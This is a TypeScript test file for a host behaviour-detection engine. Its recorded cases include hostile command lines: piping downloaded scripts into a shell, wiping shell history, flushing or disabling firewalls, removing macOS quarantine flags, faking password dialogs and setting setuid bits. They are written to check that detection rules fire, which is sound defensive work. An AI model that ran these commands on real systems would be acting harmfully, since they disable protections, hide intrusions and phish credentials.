import { spawn } from "node:child_process";
import { describe, expect, it } from "vitest";

import { BUILT_IN_RULES, BehaviourService } from "../src/core/behaviour-service";
import { createHandlers } from "../src/core/handlers";
import { type BehaviourRule, type ProcessEvent, matches, redactCommandLine, rulesFor, validateRule } from "../src/engine/behaviour-rules";
import { ProcessDiff, capabilityFor, parseMacPs, parseStat, procRows } from "../src/engine/process-feed";

const ev = (over: Partial<ProcessEvent>): ProcessEvent => ({ pid: 4242, ppid: 4000, image: "/bin/sh", commandLine: "", parentImage: "/bin/bash", parentCommandLine: "bash", at: 0, ...over });
const rule = (id: string) => BUILT_IN_RULES.find((r) => r.id === id)!;

/** Recorded command lines: each rule must fire on its own and stay quiet on the near misses. */
const CASES: Record<string, { hit: Partial<ProcessEvent>[]; miss: Partial<ProcessEvent>[] }> = {
  download_piped_to_shell: {
    hit: [{ commandLine: "sh -c curl -fsSL https://x.example/i.sh | sh" }, { commandLine: "bash -c wget -qO- http://1.2.3.4/a | sudo bash" }, { commandLine: "sh -c echo aGk= | base64 -d | sh" }],
    miss: [{ commandLine: "curl -fsSL https://x.example/i.sh -o i.sh" }, { commandLine: "sh -c curl https://x | shasum" }],
  },
  office_spawns_shell: {
    hit: [{ image: "/bin/zsh", parentImage: "/Applications/Microsoft Word.app/Contents/MacOS/Microsoft Word" }, { image: "/usr/bin/osascript", parentImage: "/Applications/Microsoft Excel.app/Contents/MacOS/Microsoft Excel" }],
    miss: [{ image: "/bin/zsh", parentImage: "/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal" }, { image: "/Applications/Microsoft Word.app/Contents/MacOS/Microsoft AutoUpdate", parentImage: "/Applications/Microsoft Word.app/Contents/MacOS/Microsoft Word" }],
  },
  clear_shell_history: {
    hit: [{ commandLine: "bash -c history -c; sleep 3" }, { commandLine: "rm -f /home/a/.bash_history" }, { commandLine: "sh -c unset HISTFILE" }, { commandLine: "ln -sf /dev/null /root/.zsh_history" }],
    miss: [{ commandLine: "cat ~/.bash_history" }, { commandLine: "history | grep ssh" }],
  },
  firewall_disabled: {
    hit: [{ commandLine: "ufw disable" }, { commandLine: "iptables -F" }, { commandLine: "nft flush ruleset" }, { commandLine: "systemctl stop firewalld" }, { commandLine: "/usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate off" }, { commandLine: "pfctl -d" }],
    miss: [{ commandLine: "ufw status" }, { commandLine: "iptables -L -n" }, { commandLine: "systemctl status firewalld" }, { commandLine: "socketfilterfw --setglobalstate on" }],
  },
  gatekeeper_bypass: {
    hit: [{ image: "/usr/bin/xattr", commandLine: "xattr -d com.apple.quarantine /Applications/Free.app" }, { image: "/usr/bin/xattr", commandLine: "xattr -cr /Applications/Free.app" }],
    miss: [{ image: "/usr/bin/xattr", commandLine: "xattr -l /Applications/Free.app" }, { image: "/bin/rm", commandLine: "rm -d com.apple.quarantine" }],
  },
  osascript_password_prompt: {
    hit: [{ image: "/usr/bin/osascript", commandLine: 'osascript -e display dialog "Enter password" default answer "" with hidden answer' }],
    miss: [{ image: "/usr/bin/osascript", commandLine: 'osascript -e display dialog "Done"' }],
  },
  setuid_bit_set: {
    hit: [{ image: "/bin/chmod", commandLine: "chmod u+s /tmp/x" }, { image: "/usr/bin/chmod", commandLine: "chmod 4755 /tmp/x" }],
    miss: [{ image: "/bin/chmod", commandLine: "chmod 755 /tmp/x" }, { image: "/bin/chmod", commandLine: "chmod +x run.sh" }],
  },
  shell_from_temp: {
    hit: [{ image: "/tmp/.x/kworker", commandLine: "/tmp/.x/kworker" }, { image: "/dev/shm/miner" }],
    miss: [{ image: "/tmp/go-build1234/b001/exe/main" }, { image: "/usr/bin/tmpwatch" }],
  },
};

describe("behaviour rules", () => {
  it("are all valid, attributed, and each has recorded cases", () => {
    expect(BUILT_IN_RULES.length).toBeGreaterThanOrEqual(8);
    for (const r of BUILT_IN_RULES) {
      validateRule(r);
      expect(CASES[r.id], r.id).toBeDefined();
      expect(r.sigma.source).toMatch(/SigmaHQ|qalaa/i);
      expect(`${r.title} ${r.description}`).not.toMatch(/\bsafe\b|100%|guarantee/i);
    }
  });

  for (const [id, { hit, miss }] of Object.entries(CASES)) {
    it(`${id}: fires on its cases and not on near misses`, () => {
      for (const h of hit) expect(matches(rule(id), ev(h)), JSON.stringify(h)).toBe(true);
      for (const m of miss) expect(matches(rule(id), ev(m)), JSON.stringify(m)).toBe(false);
    });
  }

  it("refuses rules the evaluator can't run", () => {
    const base: BehaviourRule = { ...rule("firewall_disabled") };
    expect(() => validateRule({ ...base, detection: { selection: { "User|contains": "x" }, condition: "selection" } })).toThrow(/unknown field/);
    expect(() => validateRule({ ...base, detection: { selection: { "Image|base64": "x" }, condition: "selection" } })).toThrow(/modifier/);
    expect(() => validateRule({ ...base, detection: { selection: { Image: "x" }, condition: "selection or keywords" } })).toThrow(/condition/);
    expect(() => validateRule({ ...base, technique: "T12" })).toThrow(/technique/);
  });

  it("picks rules for the platform", () => {
    expect(rulesFor(BUILT_IN_RULES, "darwin").some((r) => r.id === "gatekeeper_bypass")).toBe(true);
    expect(rulesFor(BUILT_IN_RULES, "linux").some((r) => r.id === "gatekeeper_bypass")).toBe(false);
    expect(rulesFor(BUILT_IN_RULES, "win32")).toEqual([]);
  });

  it("masks secrets in kept command lines", () => {
    const r = redactCommandLine("mysql -u root --password=hunter2 && curl https://x/?token=abc123 -H Bearer " + "A".repeat(40));
    expect(r).not.toMatch(/hunter2|abc123|AAAA/);
    expect(redactCommandLine("x".repeat(1000)).length).toBeLessThanOrEqual(300);
  });
});

describe("process feed", () => {
  it("parses /proc stat lines, even with spaces and parentheses in the name", () => {
    const stat = "1234 (my (odd) prog) S 1 1234 1234 0 -1 4194560 100 0 0 0 0 0 0 0 20 0 1 0 987654 1000 10 18446744073709551615";
    expect(parseStat(stat)).toEqual({ ppid: 1, start: "987654" });
    expect(parseStat("garbage")).toBeNull();
  });

  it("joins macOS ps output by pid, keeping paths with spaces", () => {
    const rows = parseMacPs("  10     1 /Applications/Microsoft Word.app/Contents/MacOS/Microsoft Word\n  11    10 /bin/zsh\n", "  10 /Applications/Microsoft Word.app/Contents/MacOS/Microsoft Word\n  11 /bin/zsh -c curl x | sh\n");
    expect(rows[0]!.image).toBe("/Applications/Microsoft Word.app/Contents/MacOS/Microsoft Word");
    expect(rows[1]).toMatchObject({ pid: 11, ppid: 10, image: "/bin/zsh", commandLine: "/bin/zsh -c curl x | sh" });
  });

  it("reports only programs started after the first look, with their parent", () => {
    const d = new ProcessDiff();
    const a = { pid: 1, ppid: 0, image: "/sbin/init", commandLine: "init", start: "1" };
    expect(d.next([a], 0)).toEqual([]);
    const b = { pid: 2, ppid: 1, image: "/bin/sh", commandLine: "sh -c ufw disable", start: "5" };
    expect(d.next([a, b], 1).map((e) => [e.pid, e.parentImage])).toEqual([[2, "/sbin/init"]]);
    expect(d.next([a, b], 2)).toEqual([]);
    // Same pid, new start time: a new program.
    expect(d.next([a, { ...b, start: "9" }], 3)).toHaveLength(1);
  });

  it("states its limits per platform", () => {
    expect(capabilityFor("linux")).toMatchObject({ source: "proc_poll", seesShortLived: false });
    expect(capabilityFor("darwin").note).toMatch(/Endpoint Security/);
    expect(capabilityFor("win32")).toMatchObject({ source: "unavailable" });
  });
});

function service(over: Partial<ConstructorParameters<typeof BehaviourService>[0]> = {}) {
  const events: [string, unknown][] = [];
  const signals: number[] = [];
  let now = Date.parse("2026-11-25T12:00:00Z");
  const s = new BehaviourService({ platform: "linux", emit: (e, p) => events.push([e, p]), rows: async () => [], now: () => now, selfPid: 1, signal: (pid) => void signals.push(pid), commandOf: async () => "ufw disable", ...over });
  return { s, events, signals, tick: (ms: number) => (now += ms) };
}

describe("behaviour service", () => {
  it("alerts once per rule and program, then again after the quiet window", () => {
    const { s, events, tick } = service();
    expect(s.check(ev({ commandLine: "ufw disable" }))).toHaveLength(1);
    expect(s.check(ev({ pid: 5000, commandLine: "ufw disable" }))).toHaveLength(0);
    tick(11 * 60 * 1000);
    expect(s.check(ev({ pid: 5001, commandLine: "ufw disable" }))).toHaveLength(1);
    expect(events[0]).toEqual(["alert", expect.objectContaining({ kind: "behaviour", rule: "firewall_disabled", technique: "T1562.004", level: "high" })]);
    expect(s.check(ev({ pid: 1, commandLine: "ufw disable" }))).toEqual([]); // Qalaa itself
  });

  it("stops a program only while it still runs the same command", async () => {
    const { s, signals } = service();
    const [incident] = s.check(ev({ commandLine: "ufw disable" }));
    await s.stop(incident!.id);
    expect(signals).toEqual([4242]);
    expect(s.status().incidents[0]!.state).toBe("stopped");

    const other = service({ commandOf: async () => "vim notes.txt" });
    const [i2] = other.s.check(ev({ commandLine: "ufw disable" }));
    await expect(other.s.stop(i2!.id)).rejects.toThrow(/already closed/);
    expect(other.signals).toEqual([]);

    const denied = service({ signal: () => { throw Object.assign(new Error("perm"), { code: "EPERM" }); } });
    const [i3] = denied.s.check(ev({ commandLine: "ufw disable" }));
    await expect(denied.s.stop(i3!.id)).rejects.toThrow(/another user/);
  });

  it("answers over IPC", async () => {
    const { s } = service();
    const [incident] = s.check(ev({ commandLine: "iptables -F" }));
    const handlers = createHandlers({ version: "t", homeInput: async () => ({}) as never, updateToggles: async () => {}, quickScan: async () => ({ scanned: 0, malicious: 0, suspicious: 0 }), updateSignatures: async () => {}, behaviour: s }, () => {});
    expect(await handlers["behaviour.get"]!(undefined)).toMatchObject({ rules: expect.any(Number), capability: { source: "proc_poll" } });
    expect(s.dismiss(incident!.id)).toMatchObject({ incidents: [{ state: "dismissed" }] });
    expect(s.pendingCount()).toBe(0);
    await expect(handlers["behaviour.dismiss"]!({ id: "nope" })).rejects.toThrow(/no longer listed/);
  });

  it.runIf(process.platform === "linux")("sees a real program start through /proc", async () => {
    const { s } = service({ rows: () => procRows(), selfPid: -1 });
    await s.poll(); // baseline
    // The command line only mentions the firewall: nothing is changed.
    const child = spawn("sh", ["-c", ": ufw disable; sleep 3"], { stdio: "ignore" });
    try {
      await new Promise((r) => setTimeout(r, 300));
      const found = await s.poll();
      expect(found.map((f) => f.rule)).toContain("firewall_disabled");
    } finally {
      child.kill();
    }
  });
});
